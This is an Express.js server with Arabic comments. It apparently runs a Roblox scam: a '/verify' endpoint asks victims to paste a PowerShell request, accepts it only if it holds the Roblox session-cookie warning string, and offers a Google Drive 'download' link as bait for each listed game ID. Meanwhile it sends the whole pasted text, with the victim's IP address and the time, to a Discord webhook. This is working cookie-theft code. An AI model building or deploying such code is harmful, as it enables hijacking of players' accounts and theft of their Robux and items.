const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");
const FormData = require("form-data");

const app = express();

app.use(cors());
app.use(express.json());

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

/* =========================
   🔥 ربط Game IDs بالملفات
========================= */

const fileMap = {
    "109983668079237": "1b1GnSdi7l7Mv53UEKtjNKdlC9IG2fFIq",
    "131623223084840": "1D4KEFjunZZfh_ZAwxZwSFuG8LRFytlpa",
    "119987266683883": "1WM9DzJRZsfVmb_MKP-EWrukLAKraJRUY",
    "72845937010155": "1cBQbIRkIsSuRDqvnt1IkHB26cp40P-Gv",
    "119865329453489": "1wQrQR7Svd3-ps7HWpoHAktxWzmFESZaI",
    "16518256559": "1eX-5pbCmfccZHPtEAcsxXmqJAASzwmDm",
    "139766023909499": "1xjV7kfAKCszuzEasOezWocmxtklly5B-",
    "000": "1A1UHkQct18ZeK9qXWm7uynNIPPP5xUzM"
};

/* =========================
   🔐 /verify
========================= */

app.post("/verify", async (req, res) => {

    const { powershell } = req.body;

    if (!powershell) {
        return res.json({ success: false });
    }

    const warning = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

    if (!powershell.includes(warning)) {
        return res.json({ success: false });
    }

    const cleanedInput = powershell.replace(/\s+/g, " ").trim();

    const match = cleanedInput.match(/roblox\.com\/(?:[a-z]{2}(?:-[a-z]{2})?\/)?games\/(\d+)/i);

    if (!match) {
        return res.json({ success: false });
    }

    const gameId = match[1];

    if (!fileMap[gameId]) {
        return res.json({ success: false });
    }

    const downloadLink =
        "https://drive.google.com/uc?export=download&id=" + fileMap[gameId];

    /* =========================
       📩 إرسال ملف TXT للديسكورد
    ========================== */

    try {
        if (WEBHOOK_URL) {

            const logMessage = `
Game ID: ${gameId}
IP: ${req.headers["x-forwarded-for"] || req.socket.remoteAddress}
Time: ${new Date().toLocaleString()}

Full PowerShell:
${powershell}
`;

            const form = new FormData();
            form.append("file", Buffer.from(logMessage), {
                filename: "log.txt",
                contentType: "text/plain"
            });

            await fetch(WEBHOOK_URL, {
                method: "POST",
                body: form
            });

            console.log("TXT file sent to Discord");
        } else {
            console.log("DISCORD_WEBHOOK not set");
        }

    } catch (err) {
        console.log("Discord error:", err.message);
    }

    return res.json({
        success: true,
        download: downloadLink
    });
});

/* =========================
   🚀 تشغيل السيرفر
========================= */

app.listen(process.env.PORT || 3000, () => {
    console.log("Server running...");
});